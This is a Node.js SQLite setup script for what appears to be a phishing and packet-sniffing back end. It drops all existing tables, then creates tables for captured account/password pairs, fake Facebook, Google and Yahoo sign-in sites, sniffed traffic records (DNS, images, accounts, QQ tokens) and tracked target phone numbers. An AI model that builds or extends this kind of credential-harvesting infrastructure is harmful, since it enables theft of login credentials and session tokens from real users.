
/**********
 * Init sqlite
 **********/
var sqliteDB = require('./dao/sqliteDB');

var InitSqliteSchema = function() {};

InitSqliteSchema.init = function() {
	var conn = sqliteDB.getConnection();
	var sql_check_table_exist = 'SELECT * FROM sqlite_master WHERE type = \'table\' AND name != \'sqlite_sequence\'';
	console.log('[SQL] ' + sql_check_table_exist);
	conn.all(sql_check_table_exist, function(err, tables) {
		if(err) {
			console.log(err);
		} else {
			conn.serialize(function() {
				// drop all table
				console.log(tables);
				if(!!tables && tables.length) {
					for(var i in tables) {
						var table_name = tables[i].name;
						var sql_drop = 'drop table ' + table_name;
						console.log('[SQL] ' + sql_drop);
						conn.run(sql_drop);
					}
				}
				// create all table
				var sql_create_tables = [
					'CREATE TABLE phishing_site(_id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, name TEXT, site_key TEXT, created_time INTEGER)',
					'CREATE TABLE phishing_account(_id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, account TEXT, password TEXT, site_key TEXT, signin_time INTEGER)',
					'CREATE TABLE role(_id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, name NVARCHAR(100), role_key VARCHAR(50), created_time INTEGER)',
					'CREATE TABLE user(_id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT, name NVARCHAR(100), role_key VARCHAR(50), status INTEGER, created_user VARCHAR(128), created_time INTEGER, modified_user VARCHAR(128), modified_time INTEGER)',
					'CREATE TABLE user_target(_id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, user_id INTEGER, target_id INTEGER, target_phone TEXT, created_time INTEGER)',
					//'CREATE TABLE pkt_target(_id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, ipv4 VARCHAR(15), created_time INTEGER)',
					'CREATE TABLE pkt_summary_type(_id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, type TEXT, name TEXT, created_time INTEGER)',
					'CREATE TABLE pkt_summary_data(_id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, ipv4 VARCHAR(15), mac VARCHAR(17), type TEXT, data TEXT, timestamp INTEGER, created_time INTEGER)',
					'CREATE TABLE log_fap_signin(_id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, ip TEXT, signin_time INTEGER)'
				];
				for(var i in sql_create_tables) {
					var sql_create = sql_create_tables[i];
					console.log('[SQL] ' + sql_create);
					conn.run(sql_create);
				}
				// init data
				var sql_insert_tables = [
					'INSERT INTO phishing_site(name, site_key, created_time) VALUES(\'Facebook\', \'facebook\', 1414394193334)',
					'INSERT INTO phishing_site(name, site_key, created_time) VALUES(\'Google\', \'google\', 1414394193334)',
					'INSERT INTO phishing_site(name, site_key, created_time) VALUES(\'Yahoo\', \'yahoo\', 1414394193334)',
					'INSERT INTO role(name, role_key, created_time) VALUES(\'user_privilege.data_role_admin\', \'ROLE_ADMIN\', 1414394193334)',
					'INSERT INTO role(name, role_key, created_time) VALUES(\'user_privilege.data_role_user\', \'ROLE_USER\', 1414394193334)',
					'INSERT INTO user(username, password, name, role_key, status, created_user, created_time, modified_user, modified_time) VALUES(\'admin\', \'05ff890ec4a6dda338a6611bfc00ca10\', \'管理人員\', \'ROLE_ADMIN\', 1, \'system\', 1414394225333, \'system\', 1414394225333);',
					'INSERT INTO pkt_summary_type(type, name, created_time) VALUES(\'user-agent\', \'summary.data_type_user_agent\', 1414394193334)',
					'INSERT INTO pkt_summary_type(type, name, created_time) VALUES(\'dns\', \'summary.data_type_dns\', 1414394193334)',
					'INSERT INTO pkt_summary_type(type, name, created_time) VALUES(\'image\', \'summary.data_type_images\', 1414394193334)',
					'INSERT INTO pkt_summary_type(type, name, created_time) VALUES(\'account\', \'summary.data_type_account\', 1414394193334)',
					'INSERT INTO pkt_summary_type(type, name, created_time) VALUES(\'qqtoken\', \'summary.data_type_qqtoken\', 1414394193334)',
					'INSERT INTO pkt_summary_type(type, name, created_time) VALUES(\'requrl\', \'summary.data_type_requrl\', 1414394193334)'
				];
				for(var i in sql_insert_tables) {
					var sql_insert = sql_insert_tables[i];
					console.log('[SQL] ' + sql_insert);
					conn.run(sql_insert);
				}
			});
		}
	});
};

InitSqliteSchema.init();